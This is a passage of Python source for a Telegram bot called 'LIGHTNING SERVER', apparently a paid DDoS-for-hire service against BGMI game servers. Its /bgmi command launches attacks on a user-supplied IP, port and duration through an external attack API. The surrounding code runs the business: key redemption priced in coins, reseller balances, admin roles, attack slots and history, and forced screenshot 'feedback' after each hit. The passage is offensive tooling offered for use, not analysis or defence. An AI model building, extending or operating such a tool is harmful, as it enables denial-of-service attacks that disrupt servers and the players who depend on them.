    state["api_config"] = {"key": ""}
    save_state()
    bot.reply_to(message, "✅ **API Key Removed!**", parse_mode='Markdown')

@bot.message_handler(commands=['viewapikey'])
@owner_only
def view_api_key_command(message):
    key = _get_api_key()
    if not key:
        bot.reply_to(message, "🔧 **API CONFIG**\n\n📊 Status: ❌ Not Configured", parse_mode='Markdown')
        return
    masked = key[:6] + "..." + key[-4:] if len(key) > 12 else "***"
    bot.reply_to(message, f"""🔧 **API CONFIG**

📊 Status: ✅ Ready
🔑 Key: `{masked}`""", parse_mode='Markdown')

# ==================== KEY COMMANDS ====================

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = get_uid(message)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /redeem <key>\nExample: /redeem ABC123XYZ")
        return
    key = command[1].upper()
    success, msg = redeem_key(user_id, key)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['generate'])
@authorized_only
def generate_key_command(message):
    user_id = get_uid(message)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, """❌ Usage: /generate <duration>

Available durations:
• /generate 6hr - 6 Hours (50 coins)
• /generate 1day - 1 Day (80 coins)
• /generate 3days - 3 Days (200 coins)
• /generate 7days - 7 Days (400 coins)
• /generate 30days - 30 Days (700 coins)
• /generate 60days - 60 Days (1000 coins)""")
        return
    duration_str = command[1].lower()
    duration_map = {
        '6hr':   (6, 'hr'),
        '1day':  (1, 'day'),
        '3days': (3, 'day'),
        '7days': (7, 'day'),
        '30days':(30, 'day'),
        '60days':(60, 'day')
    }
    if duration_str not in duration_map:
        bot.reply_to(message, "❌ Invalid duration. Available: 6hr, 1day, 3days, 7days, 30days, 60days")
        return
    dur, dur_type = duration_map[duration_str]

    if is_seller(user_id) and not is_admin(user_id):
        cost = SELLER_PRICES.get(duration_str, {}).get('cost', 0)
        balance = get_seller_balance(user_id)
        if balance < cost:
            bot.reply_to(message, f"""❌ Insufficient Balance!

💰 Your balance: {balance} coins
🔑 {duration_str} key cost: {cost} coins
❌ Need {cost - balance} more coins""")
            return
        success, new_balance = deduct_seller_balance(user_id, cost)
        if not success:
            bot.reply_to(message, f"❌ Insufficient balance!")
            return
        key = generate_key(dur, dur_type, user_id)
        if key:
            display_name = SELLER_PRICES.get(duration_str, {}).get('display', duration_str)
            bot.reply_to(message, f"""✅ Key Generated!

🔑 Key: `{key}`
⏱ Duration: {display_name}
💰 Cost: {cost} coins
📊 Remaining: {new_balance} coins

📌 Redeem: /redeem {key}""", parse_mode='Markdown')
    else:
        key = generate_key(dur, dur_type, user_id)
        if key:
            display_name = SELLER_PRICES.get(duration_str, {}).get('display', duration_str)
            bot.reply_to(message, f"""✅ Key Generated!

🔑 Key: `{key}`
⏱ Duration: {display_name}
👑 Admin/Owner Key (No Cost)

📌 Redeem: /redeem {key}""", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def balance_command(message):
    user_id = get_uid(message)
    if not is_seller(user_id):
        bot.reply_to(message, "❌ This command is only for sellers.")
        return
    balance = get_seller_balance(user_id)
    bot.reply_to(message, f"""💰 **Your Balance**

📊 Balance: `{balance}` coins

📌 Key Costs:
• 6 Hours: 50 coins
• 1 Day: 80 coins
• 3 Days: 200 coins
• 7 Days: 400 coins
• 30 Days: 700 coins
• 60 Days: 1000 coins""", parse_mode='Markdown')

@bot.message_handler(commands=['keyslist'])
@authorized_only
def keyslist_command(message):
    user_id = get_uid(message)
    if not state.get("redeem_keys"):
        bot.reply_to(message, "ℹ️ No keys generated yet.")
        return
    clean_expired_keys()
    response = "🔑 Generated Keys:\n\n"
    key_count = 0
    for key, data in state["redeem_keys"].items():
        if is_seller(user_id) and not is_admin(user_id):
            if data.get("generated_by") != user_id:
                continue
        key_count += 1
        status = "✅ Used" if data.get("used") else "🆓 Available"
        expiry = datetime.datetime.fromtimestamp(data["expires"]).strftime('%d-%m %H:%M')
        response += f"• `{key}`\n   {status} | Expires: {expiry}\n\n"
    if key_count == 0:
        bot.reply_to(message, "ℹ️ No keys found.")
        return
    bot.reply_to(message, response, parse_mode='Markdown')

# ==================== DELETE KEY ====================

@bot.message_handler(commands=['deletekey'])
def delete_key_command(message):
    user_id = get_uid(message)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /deletekey <key>")
        return
    key = command[1].upper()
    if key not in state["redeem_keys"]:
        bot.reply_to(message, "❌ Key not found.")
        return
    key_data = state["redeem_keys"][key]
    
    if is_admin(user_id) or is_owner(user_id):
        used_by = key_data.get("used_by")
        del state["redeem_keys"][key]
        if used_by:
            revoke_user_access(used_by)
        save_state()
        bot.reply_to(message, f"✅ Key deleted!", parse_mode='Markdown')
        return
    
    if is_seller(user_id):
        if key_data.get("generated_by") == user_id:
            used_by = key_data.get("used_by")
            del state["redeem_keys"][key]
            if used_by:
                revoke_user_access(used_by)
            save_state()
            bot.reply_to(message, f"✅ Your key deleted!", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ You can only delete YOUR OWN generated keys!")
        return
    bot.reply_to(message, "❌ No permission.")

@bot.message_handler(commands=['cleankeys'])
@admin_only
def clean_keys_command(message):
    deleted = clean_expired_keys()
    if deleted > 0:
        bot.reply_to(message, f"🧹 Cleaned {deleted} expired key(s)!")
    else:
        bot.reply_to(message, "✅ No expired keys.")

# ==================== KEY INFO ====================

@bot.message_handler(commands=['keyinfo'])
@admin_only
def key_info_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /keyinfo <key>")
        return
    key = command[1].upper()
    if key not in state["redeem_keys"]:
        bot.reply_to(message, "❌ Key not found.")
        return
    data = state["redeem_keys"][key]
    
    generated_by = data.get("generated_by", "Unknown")
    if generated_by and generated_by != "None":
        try:
            gen_user = bot.get_chat(int(generated_by))
            gen_name = f"@{gen_user.username}" if gen_user.username else generated_by
        except:
            gen_name = generated_by
    else:
        gen_name = "System"
    
    used_by = data.get("used_by")
    if used_by:
        try:
            used_user = bot.get_chat(int(used_by))
            used_name = f"@{used_user.username}" if used_user.username else used_by
        except:
            used_name = used_by
    else:
        used_name = "Not used"
    
    expiry = datetime.datetime.fromtimestamp(data["expires"]).strftime('%Y-%m-%d %H:%M:%S')
    generated_at = datetime.datetime.fromtimestamp(data.get("generated_at", 0)).strftime('%Y-%m-%d %H:%M:%S')
    redeemed_at = "N/A"
    if data.get("redeemed_at"):
        redeemed_at = datetime.datetime.fromtimestamp(data["redeemed_at"]).strftime('%Y-%m-%d %H:%M:%S')
    
    response = f"""🔑 **KEY INFO**

📌 Key: `{key}`
⏱ Duration: {data.get('duration', 'N/A')}
📊 Status: {'✅ Used' if data.get('used') else '🆓 Available'}
📅 Expires: {expiry}

👤 Generated By: {gen_name}
📅 Generated At: {generated_at}

👤 Used By: {used_name}
📅 Redeemed At: {redeemed_at}"""
    bot.reply_to(message, response, parse_mode='Markdown')

# ==================== USER INFO ====================

@bot.message_handler(commands=['userinfo'])
@admin_only
def user_info_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /userinfo <user_id>")
        return
    uid = str(command[1])
    user = state["users"].get(uid)
    if not user:
        bot.reply_to(message, "❌ User not found in database.")
        return
    
    try:
        chat = bot.get_chat(int(uid))
        username = f"@{chat.username}" if chat.username else f"ID:{uid}"
        name = chat.first_name or "Unknown"
    except:
        username = f"ID:{uid}"
        name = "Unknown"
    
    expires = user.get("expires", 0)
    if expires > now():
        remaining = int((expires - now()) / 86400)
        hours = int(((expires - now()) % 86400) / 3600)
        expiry_str = f"{remaining}d {hours}h remaining"
        expiry_date = datetime.datetime.fromtimestamp(expires).strftime('%Y-%m-%d %H:%M:%S')
    else:
        expiry_str = "❌ Expired/Revoked"
        expiry_date = datetime.datetime.fromtimestamp(expires).strftime('%Y-%m-%d %H:%M:%S') if expires else "N/A"
    
    plan = user.get("plan", "N/A")
    key_used = user.get("key_used", "N/A")
    redeemed_at = user.get("redeemed_at", 0)
    redeemed_str = datetime.datetime.fromtimestamp(redeemed_at).strftime('%Y-%m-%d %H:%M:%S') if redeemed_at else "N/A"
    
    balance = user.get("balance", 0)
    feedback_pending = user.get("feedback_pending", False)
    feedback_str = "⚠️ Pending Screenshot" if feedback_pending else "✅ None"
    
    response = f"""👤 **USER INFO**

📛 Name: {name}
🆔 ID: `{uid}`
🔗 Username: {username}

📦 Plan: {plan}
⏱ Expiry: {expiry_str}
📅 Expiry Date: {expiry_date}
✅ Approved: {'Yes' if user.get('approved') else 'No'}

🔑 Key Used: `{key_used}`
📅 Redeemed At: {redeemed_str}

💰 Balance: {balance} coins
📸 Feedback: {feedback_str}

👑 Admin: {'Yes' if is_admin(uid) else 'No'}
🛒 Seller: {'Yes' if is_seller(uid) else 'No'}"""
    bot.reply_to(message, response, parse_mode='Markdown')

# ==================== ALL USERS ====================

@bot.message_handler(commands=['allusers'])
@admin_only
def show_all_users(message):
    all_ids = set()
    all_ids.update(state["users"].keys())
    all_ids.update(allowed_user_ids)
    all_ids.update(state.get("admins", []))
    all_ids.update(state.get("sellers", []))
    all_ids.update(state.get("resellers", []))
    all_ids.update(state.get("owners", []))
    
    for entry in state.get("attack_history", []):
        uid = entry.get("user_id")
        if uid:
            all_ids.add(str(uid))
    
    for slot in state.get("attack_slots", []):
        if slot and slot.get("user_id"):
            all_ids.add(str(slot["user_id"]))
    
    all_ids = {uid for uid in all_ids if uid and uid != "None"}
    
    if not all_ids:
        bot.reply_to(message, "ℹ️ No users found.")
        return
    
    try:
        sorted_ids = sorted(all_ids, key=lambda x: int(x))
    except:
        sorted_ids = sorted(all_ids)
    
    response = f"👥 **ALL BOT USERS** (Total: {len(sorted_ids)})\n\n"
    
    for idx, uid in enumerate(sorted_ids, 1):
        user = state["users"].get(uid, {})
        try:
            chat = bot.get_chat(int(uid))
            uname = f"@{chat.username}" if chat.username else (chat.first_name or uid)
        except:
            uname = uid
        
        role = ""
        if is_owner(uid):
            role = " 👑 OWNER"
        elif is_admin(uid):
            role = " ⚡ ADMIN"
        elif is_seller(uid):
            role = " 🛒 SELLER"
        
        expires = user.get("expires", 0)
        plan = user.get("plan", "N/A")
        
        if expires > now():
            days_left = int((expires - now()) / 86400)
            hours_left = int(((expires - now()) % 86400) / 3600)
            expiry_short = f"✅ {days_left}d {hours_left}h"
        elif expires > 0:
            expiry_short = "❌ Expired"
        else:
            expiry_short = "❌ No Access"
        
        approved = "✅" if user.get("approved") else "❌"
        
        response += f"**{idx}.** `{uid}`\n"
        response += f"   👤 {uname}{role}\n"
        response += f"   📦 Plan: {plan} | ⏱ {expiry_short}\n"
        response += f"   ✅ Approved: {approved}\n\n"
    
    if len(response) > 4000:
        part1 = response[:4000]
        part2 = response[4000:]
        bot.reply_to(message, part1, parse_mode='Markdown')
        if part2:
            bot.send_message(message.chat.id, part2, parse_mode='Markdown')
    else:
        bot.reply_to(message, response, parse_mode='Markdown')

# ==================== SELLER MANAGEMENT ====================

@bot.message_handler(commands=['addseller', 'addreseller'])
@admin_only
def add_seller_command(message):
    user_id = get_uid(message)
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "❌ Usage: /addseller <id> <coins>")
        return
    try:
        seller_id = str(command[1])
        coins = int(command[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid format.\nUsage: /addseller <id> <coins>")
        return
    
    if is_seller(seller_id):
        bot.reply_to(message, f"ℹ️ Already a seller.")
        return
    
    if seller_id not in state["users"]:
        state["users"][seller_id] = {}
    
    state["sellers"].append(seller_id)
    set_seller_balance(seller_id, coins)
    save_state()
    
    bot.reply_to(message, f"""✅ **Seller Added!**

🆔 ID: `{seller_id}`
💰 Coins: `{coins}`

📌 Rates: Same as normal user
📌 Permissions: Generate & sell keys
📌 Can only delete own generated keys""", parse_mode='Markdown')

@bot.message_handler(commands=['removeseller', 'removereseller'])
@admin_only
def remove_seller_command(message):
    user_id = get_uid(message)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removeseller <id>")
        return
    seller_id = command[1]
    
    if not is_seller(seller_id):
        bot.reply_to(message, f"❌ Not a seller.")
        return
    
    if seller_id in state["sellers"]:
        state["sellers"].remove(seller_id)
    if seller_id in state.get("resellers", []):
        state["resellers"].remove(seller_id)
    save_state()
    bot.reply_to(message, f"✅ Seller `{seller_id}` removed!", parse_mode='Markdown')

@bot.message_handler(commands=['sellerlist', 'resellerlist', 'sellers'])
@admin_only
def seller_list_command(message):
    sellers = state.get("sellers", [])
    if not sellers:
        bot.reply_to(message, "ℹ️ No sellers.")
        return
    response = "🛒 **SELLER LIST**\n\n"
    for sid in sellers:
        balance = get_seller_balance(sid)
        try:
            chat = bot.get_chat(int(sid))
            uname = f"@{chat.username}" if chat.username else sid
        except:
            uname = sid
        response += f"• `{sid}` | {uname}\n   💰 Balance: `{balance}` coins\n\n"
    response += f"\n📊 Total Sellers: {len(sellers)}"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['sellerbalance', 'resellerbalance'])
@admin_only
def seller_balance_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /sellerbalance <id>")
        return
    seller_id = command[1]
    if not is_seller(seller_id):
        bot.reply_to(message, f"❌ Not a seller.")
        return
    balance = get_seller_balance(seller_id)
    bot.reply_to(message, f"💰 Balance: `{balance}` coins", parse_mode='Markdown')

@bot.message_handler(commands=['addbalance'])
@admin_only
def add_balance_command(message):
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "❌ Usage: /addbalance <id> <amount>")
        return
    try:
        seller_id = str(command[1])
        amount = int(command[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid format.")
        return
    if amount <= 0:
        bot.reply_to(message, "❌ Amount must be positive.")
        return
    if not is_seller(seller_id):
        bot.reply_to(message, f"❌ Not a seller.")
        return
    new_balance = add_seller_balance(seller_id, amount)
    bot.reply_to(message, f"✅ Added {amount} coins. New: {new_balance}")

# ==================== GROUP MANAGEMENT ====================

@bot.message_handler(commands=['addgroup'])
@admin_only
def add_group_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /addgroup <group_id>")
        return
    group_id = command[1]
    if is_group_allowed(group_id):
        bot.reply_to(message, f"ℹ️ Already allowed.")
        return
    state["groups"].append(group_id)
    save_state()
    bot.reply_to(message, f"✅ Group `{group_id}` added!", parse_mode='Markdown')

@bot.message_handler(commands=['removegroup'])
@admin_only
def remove_group_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removegroup <group_id>")
        return
    group_id = command[1]
    if not is_group_allowed(group_id):
        bot.reply_to(message, f"❌ Not allowed.")
        return
    state["groups"].remove(group_id)
    save_state()
    bot.reply_to(message, f"✅ Group removed!")

@bot.message_handler(commands=['groups'])
@admin_only
def list_groups_command(message):
    groups = state.get("groups", [])
    if not groups:
        bot.reply_to(message, "ℹ️ No groups.")
        return
    response = "📌 **Allowed Groups:**\n\n"
    for group_id in groups:
        response += f"• `{group_id}`\n"
    bot.reply_to(message, response, parse_mode='Markdown')

# ==================== ADMIN MANAGEMENT (OWNER ONLY) ====================

@bot.message_handler(commands=['addadmin'])
@owner_only
def add_admin_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /addadmin <id>\n\n🔒 Owner only command.")
        return
    uid = command[1]
    if uid in state.get("admins", []):
        bot.reply_to(message, "ℹ️ Already admin.")
        return
    state["admins"].append(uid)
    save_state()
    bot.reply_to(message, f"✅ Admin `{uid}` added!\n\n👑 Owner action", parse_mode='Markdown')

@bot.message_handler(commands=['removeadmin'])
@owner_only
def remove_admin_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removeadmin <id>\n\n🔒 Owner only command.")
        return
    uid = command[1]
    
    if uid == OWNER_ID:
        bot.reply_to(message, "❌ Cannot remove the Owner!")
        return
    
    if uid not in state.get("admins", []):
        bot.reply_to(message, "❌ Not an admin.")
        return
    
    state["admins"].remove(uid)
    save_state()
    bot.reply_to(message, f"✅ Admin `{uid}` removed!\n\n👑 Owner action", parse_mode='Markdown')

@bot.message_handler(commands=['add'])
@admin_only
def add_user(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /add <id>")
        return
    user_to_add = command[1]
    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "ℹ️ Already exists.")
        return
    allowed_user_ids.append(user_to_add)
    with open(USER_FILE, "a") as file:
        file.write(f"{user_to_add}\n")
    state["users"][user_to_add] = {"approved": True, "expires": now() + 86400 * 30, "plan": "manual"}
    save_state()
    bot.reply_to(message, f"✅ User `{user_to_add}` added!", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
@admin_only
def remove_user(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /remove <id>")
        return
    user_to_remove = command[1]
    if user_to_remove not in allowed_user_ids:
        bot.reply_to(message, "❌ Not found.")
        return
    allowed_user_ids.remove(user_to_remove)
    with open(USER_FILE, "w") as file:
        for uid in allowed_user_ids:
            file.write(f"{uid}\n")
    if user_to_remove in state["users"]:
        del state["users"][user_to_remove]
        save_state()
    bot.reply_to(message, f"✅ User removed!")

# ==================== BGMI ATTACK ====================

@bot.message_handler(commands=['bgmi'])
@check_access
def handle_bgmi(message):
    user_id = get_uid(message)
    chat_id = message.chat.id
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "❌ Usage: /bgmi <ip> <port> <time>")
        return

    target, port_str, time_str = command[1], command[2], command[3]

    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        bot.reply_to(message, "❌ Invalid IP.")
        return

    try:
        port = int(port_str)
        duration = int(time_str)
        if not 1 <= port <= 65535:
            bot.reply_to(message, "❌ Port must be 1-65535.")
            return
        if duration < 10:
            bot.reply_to(message, "❌ Minimum 10 seconds.")
            return
        max_time = get_max_time()
        if duration > max_time:
            bot.reply_to(message, f"❌ Maximum time is {max_time}s.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Invalid numbers.")
        return

    if not is_admin(user_id) and not is_owner(user_id):
        needs_fb, remaining, is_cooldown = user_needs_feedback(user_id)
        
        if is_cooldown:
            mins = remaining // 60
            secs = remaining % 60
            bot.reply_to(message, f"""🚫 **10 MINUTE COOLDOWN ACTIVE!**

You didn't send feedback in time.

⏱ Remaining: {mins}m {secs}s
📌 You can attack again after cooldown ends.

⚠️ **Next time:** Send screenshot within 2 minutes!""", parse_mode='Markdown')
            return
        
        if needs_fb:
            bot.reply_to(message, f"""⚠️ **SCREENSHOT FEEDBACK REQUIRED!**

You must send a screenshot of your last attack before attacking again!

📸 How to submit:
→ Just send the screenshot as a photo in this chat
→ Bot will auto-forward it to admin

⏱ Time remaining: {remaining}s
⚠️ After {remaining}s, you'll get 10 minute cooldown!""", parse_mode='Markdown')
            return

    if not _get_api_key():
        if is_owner(user_id):
            bot.reply_to(message, "❌ API key not set!\nUse /addapikey <key>")
        else:
            bot.reply_to(message, "❌ Service unavailable.")
        return

    cooldown = get_cooldown()
    if cooldown > 0 and not is_admin(user_id) and not is_owner(user_id):
        user_data = state["users"].get(str(user_id), {})
        last_attack = user_data.get("last_attack", 0)
        elapsed = now() - last_attack
        if elapsed < cooldown:
            remaining_cd = int(cooldown - elapsed)
            bot.reply_to(message, f"⏱ Cooldown active! Wait {remaining_cd}s.")
            return

    clean_stuck_attacks()

    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
    except:
        username = f"ID:{user_id}"

    is_admin_user = is_admin(user_id)
    is_owner_user = is_owner(user_id)

    attack_data, reserve_err = reserve_attack_slot(
        user_id, target, port, duration,
        username, is_admin_user, is_owner_user
    )

    total_slots = get_total_slots()

    if reserve_err == "RUNNING":
        remaining = int(attack_data.get('expires', 0) - now())
        if remaining < 0:
            remaining = 0
        bot.reply_to(message, f"❌ Attack in progress! {remaining}s left.")
        return

    if reserve_err == "FULL":
        active = get_active_attack_count()
        bot.reply_to(message, f"❌ All {total_slots} slots busy! Active: {active}")
        return

    log_command(user_id, target, port, duration)

    msg = bot.reply_to(message, "⚡ Initiating attack...")
    msg_id = msg.message_id

    result = start_attack(target, port, duration)

    if not result.get("success"):
        remove_attack_from_slot(user_id)
        if is_owner_user:
            error = sanitize_error(result.get("error", "Unknown"))
        else:
            error = "Service unavailable."
        bot.edit_message_text(f"❌ Attack Failed!\n{error}", chat_id, msg_id)
        return

    if str(user_id) not in state["users"]:
        state["users"][str(user_id)] = {}
    state["users"][str(user_id)]["last_attack"] = now()

    if not is_admin_user and not is_owner_user:
        mark_feedback_pending(user_id, target, port, duration, chat_id)

    slot_index = attack_data.get('slot', 0)

    state["attack_history"].append({
        "user_id": user_id, "username": username,
        "ip": target, "port": port, "duration": duration,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "is_admin": is_admin_user, "is_owner": is_owner_user, "slot": slot_index
    })

    if len(state["attack_history"]) > 100:
        state["attack_history"] = state["attack_history"][-100:]

    save_state()

    if is_owner_user:
        admin_tag = " 👑 OWNER"
    elif is_admin_user:
        admin_tag = " 👑 ADMIN"
    else:
        admin_tag = ""

    timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
📌 Your Slot: {slot_index + 1}/{total_slots}

🔥 LIGHTNING SERVER"""

    bot.edit_message_text(timer_text, chat_id, msg_id)

    threading.Thread(
        target=update_timer,
        args=(chat_id, msg_id, target, port, duration, is_admin_user, is_owner_user, user_id, slot_index),
        daemon=True
    ).start()

    def notify_end():
        time.sleep(duration + 3)
        remove_attack_from_slot(user_id, slot_index)
        try:
            if not is_admin_user and not is_owner_user:
                final_text = f"""✅ ATTACK COMPLETED!

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
📌 Slot: {slot_index + 1}/{total_slots}

📸 **SEND SCREENSHOT NOW!**
🔘 Click ✅ Hit or ❌ Miss below
⏱ You have **2 MINUTES** to give feedback!

⚠️ **FEEDBACK DEDE NHI TO 10 MINUTES KE LYE BAN HO JAYEGA!**

🔥 LIGHTNING SERVER"""
                
                markup = types.InlineKeyboardMarkup(row_width=2)
                btn_hit = types.InlineKeyboardButton("✅ HIT", callback_data=f"fb_hit_{user_id}")
                btn_miss = types.InlineKeyboardButton("❌ MISS", callback_data=f"fb_miss_{user_id}")
                markup.add(btn_hit, btn_miss)
                
                try:
                    bot.edit_message_text(
                        final_text,
                        chat_id, msg_id,
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
                except:
                    bot.send_message(
                        chat_id, final_text,
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
            else:
                final_text = f"""✅ ATTACK COMPLETED!

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
📌 Slot: {slot_index + 1}/{total_slots}

🔥 LIGHTNING SERVER"""
                try:
                    bot.edit_message_text(final_text, chat_id, msg_id)
                except:
                    bot.send_message(chat_id, final_text)
        except Exception as e:
            print(f"notify_end error: {e}")

    threading.Thread(target=notify_end, daemon=True).start()

# ==================== ATTACK INFO COMMANDS ====================

@bot.message_handler(commands=['activeattacks'])
@admin_only
def active_attacks_command(message):
    clean_stuck_attacks()
    total_slots = get_total_slots()
    active_slots = [(i, s) for i, s in enumerate(state["attack_slots"]) if s and s.get('status') == 'running']
    if not active_slots:
        bot.reply_to(message, f"📊 No active attacks. Slots: 0/{total_slots}")
        return
    response = "🔥 ACTIVE ATTACKS:\n\n"
    for i, (si, attack) in enumerate(active_slots, 1):
        remaining = int(attack.get('expires', 0) - now())
        response += f"#{i} Slot {si+1}: {attack.get('ip')}:{attack.get('port')} | {remaining}s\n"
    response += f"\n📊 Total: {len(active_slots)}/{total_slots}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['attackhistory'])
@admin_only
def attack_history_command(message):
    history = state.get("attack_history", [])
    if not history:
        bot.reply_to(message, "📊 No history.")
        return
    response = "📜 ATTACK HISTORY (Last 10):\n\n"
    for i, entry in enumerate(reversed(history[-10:]), 1):
        response += f"#{i} {entry.get('ip')}:{entry.get('port')} | {entry.get('duration')}s | {entry.get('start_time')}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def status_attack(message):
    user_id = get_uid(message)
    clean_stuck_attacks()
    total_slots = get_total_slots()
    existing_attack = get_user_attack_slot(user_id)
    if existing_attack:
        remaining = int(existing_attack.get('expires', 0) - now())
        if remaining > 0:
            bot.reply_to(message, f"⚡ Attack running: {remaining}s left | Slot: {existing_attack.get('slot', 0) + 1}/{total_slots}")
            return
    
    fb_note = ""
    if not is_admin(user_id) and not is_owner(user_id):
        needs_fb, remaining, is_cooldown = user_needs_feedback(user_id)
        if is_cooldown:
            mins = remaining // 60
            secs = remaining % 60
            fb_note = f"\n\n🚫 **10 MIN COOLDOWN!**\n⏱ {mins}m {secs}s remaining"
        elif needs_fb:
            fb_note = f"\n\n📸 **Screenshot feedback pending!**\nSend photo! ({remaining}s left)"
    
    active_attacks = get_active_attack_count()
    bot.reply_to(message, f"⚡ No active attack.\n📊 Your slot available.{fb_note}", parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    clean_stuck_attacks()
    total_slots = get_total_slots()
    response = f"""📊 LIGHTNING SERVER STATS:

👥 Users: {len(allowed_user_ids)}
🔥 Active: {get_active_attack_count()}
👑 Admins: {len(state.get('admins', []))}
🛒 Sellers: {len(state.get('sellers', []))}
📌 Groups: {len(state.get('groups', []))}
📜 Total Attacks: {len(state.get('attack_history', []))}
📊 Slots: {total_slots}
⏱ Max Time: {get_max_time()}s
🕐 Cooldown: {get_cooldown()}s"""
    bot.reply_to(message, response)

# ==================== OWNER PANEL ====================

@bot.message_handler(commands=['ownerpanel'])
@owner_only
def owner_panel(message):
    clean_stuck_attacks()
    total_slots = get_total_slots()
    fb_channel = get_feedback_channel()
    response = f"""👑 LIGHTNING SERVER OWNER PANEL

📊 SYSTEM STATUS:
• Bot: Online ✅
• Slots: {total_slots}
• Cooldown: {get_cooldown()}s
• Max Time: {get_max_time()}s
• API: {'✅ Set' if _get_api_key() else '❌ Not Set'}
• Feedback Channel: {fb_channel if fb_channel else '❌ Not Set'}
• Feedback Window: 2 min → else 10 min cooldown

📊 STATISTICS:
• Users: {len(allowed_user_ids)}
• Active: {get_active_attack_count()}/{total_slots}
• Admins: {len(state.get('admins', []))}
• Sellers: {len(state.get('sellers', []))}
• Groups: {len(state.get('groups', []))}
• Total Attacks: {len(state.get('attack_history', []))}
• Total Keys: {len(state.get('redeem_keys', []))}

⚙️ SETTINGS:
/setslot <number>
/setcooldown <seconds>
/setmaxtime <seconds>
/setfeedbackchannel <channel_id>

🔧 API (Owner Only):
/addapikey /removeapikey /viewapikey

👑 ADMIN (Owner Only):
/addadmin /removeadmin

🛒 SELLER:
/addseller <id> <coins>
/removeseller <id>
/sellerlist
/addbalance <id> <amount>
/sellerbalance <id>

📌 GROUP:
/addgroup /removegroup /groups

🔍 USER:
/allusers /userinfo /keyinfo /deletekey

🔥 LIGHTNING SERVER POWER!"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearbotstate'])
@owner_only
def clear_bot_state_command(message):
    state["attack_slots"] = [None] * get_total_slots()
    state["attack_history"] = []
    save_state()
    bot.reply_to(message, "✅ Bot state cleared!")

# ==================== LOGS ====================

@bot.message_handler(commands=['logs'])
@admin_only
def show_logs(message):
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except:
            bot.reply_to(message, "❌ Error sending logs.")
    else:
        bot.reply_to(message, "ℹ️ No logs.")

@bot.message_handler(commands=['clearlogs'])
@admin_only
def clear_logs_command(message):
    try:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        bot.reply_to(message, "✅ Logs cleared.")
    except:
        bot.reply_to(message, "❌ Failed.")

@bot.message_handler(commands=['broadcast'])
@admin_only
def broadcast_message(message):
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "❌ Usage: /broadcast <message>")
        return
    broadcast_text = f"📢 Broadcast:\n\n{command[1]}"
    sent = 0
    for uid in allowed_user_ids:
        try:
            bot.send_message(uid, broadcast_text)
            sent += 1
        except:
            pass
    bot.reply_to(message, f"✅ Sent to {sent} users.")

# ==================== HELP ====================

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = get_uid(message)
    if is_owner(user_id):
        help_text = f"""🌟 LIGHTNING SERVER - OWNER HELP

💥 /bgmi <ip> <port> <time>
🔑 /redeem <key>
📊 /status /plan /id

⚙️ SETTINGS:
/setslot <number> - Current: {get_total_slots()}
/setcooldown <seconds> - Current: {get_cooldown()}s
/setmaxtime <seconds> - Current: {get_max_time()}s
/setfeedbackchannel <channel_id>

🔧 API (Owner Only):
/addapikey /removeapikey /viewapikey

👑 ADMIN (Owner Only):
/addadmin /removeadmin

🛒 SELLER (Admin & Owner):
/addseller /removeseller /sellerlist
/addbalance /sellerbalance

📌 FEEDBACK: 2 min → else 10 min cooldown"""
    else:
        help_text = f"""🌟 LIGHTNING SERVER - HELP

💥 /bgmi <ip> <port> <time>
🔑 /redeem <key>
📊 /status /plan /id /help

📸 **SCREENSHOT FEEDBACK RULE:**
1. After attack, click ✅ HIT or ❌ MISS
2. Send screenshot as photo
3. Done!

⏱ **2 MINUTES to give feedback**
⚠️ Else → **10 MIN COOLDOWN**

📌 Max Time: {get_max_time()}s"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    uid = get_uid(message)
